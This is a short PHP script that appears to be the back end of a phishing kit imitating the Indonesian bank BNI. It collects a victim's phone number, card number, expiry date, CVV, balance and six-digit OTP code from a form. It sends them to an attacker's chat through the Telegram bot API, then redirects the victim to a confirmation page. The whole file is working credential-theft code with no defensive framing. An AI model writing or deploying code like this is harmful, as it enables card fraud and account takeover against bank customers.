<?php 



session_start();
include "./telegram.php";

$_SESSION['phoneNumber'] = $_POST['phoneNumber'];

$message = "━─━────༺𝗕𝗡𝗜༻────━─━\n"."※ 𝗡𝗼.𝗛𝗣        : ".  $_POST ['nomor_hp']. "\n※ 𝗡𝗼. 𝗞𝗮𝗿𝘁𝘂  : ". $_POST ['no_kartu']. "\n※ 𝗩𝗮𝗹𝗶𝗱 𝗧𝗵𝗿𝘂 : ". $_POST ['bulan']. "/". $_POST ['tahun']. "\n※ 𝗖𝗩𝗩             : ". $_POST ['cvvkode']. "\n※ 𝗦𝗮𝗹𝗱𝗼          : ". $_POST ['saldo']. "\n\n※ 𝗞𝗼𝗱𝗲 𝗢𝗧𝗣 : ".$_POST['pin1'] .$_POST['pin2'].$_POST['pin3'].$_POST['pin4'].$_POST['pin5'].$_POST['pin6'];
function sendMessage($telegram_id, $message, $id_bot)
{
$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $id_bot);
header("Location:  konf.html");
?> 